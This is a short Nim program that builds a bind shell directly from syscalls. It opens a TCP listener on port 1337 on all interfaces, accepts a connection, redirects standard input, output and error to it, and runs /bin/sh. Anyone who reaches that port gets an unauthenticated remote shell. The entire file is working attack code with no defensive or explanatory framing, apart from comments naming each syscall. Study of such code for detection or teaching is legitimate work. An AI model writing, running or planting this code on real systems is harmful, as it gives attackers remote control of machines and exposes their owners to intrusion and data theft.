import std/posix
import syscall

proc main() =
  # socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
  var s = syscall(SOCKET, 2, 1, 0)

  # bind(s, {AF_INET, 1337, INADDR_ANY}, 16)
  var
    sockaddr = SockAddr_in()
    in_addr = InAddr()
  in_addr.s_addr = 0.uint32           # 0.0.0.0
  sockaddr.sin_family = 2.uint16
  sockaddr.sin_port = 14597.uint16    # htons(1337)
  sockaddr.sin_addr = in_addr

  discard syscall(BIND, s, sockaddr.unsafeAddr, 16)

  # listen(s, 0)
  discard syscall(LISTEN, s, 0)

  # accept(s, 0, 0)
  var fd = syscall(ACCEPT, s, 0, 0)

  # dup2
  for i in 0 .. 2:
    discard syscall(DUP2, fd, i)

  # execve("/bin/sh", NULL, NULL)
  discard syscall(EXECVE, cstring("/bin/sh"), 0, 0)

when isMainModule:
  main()
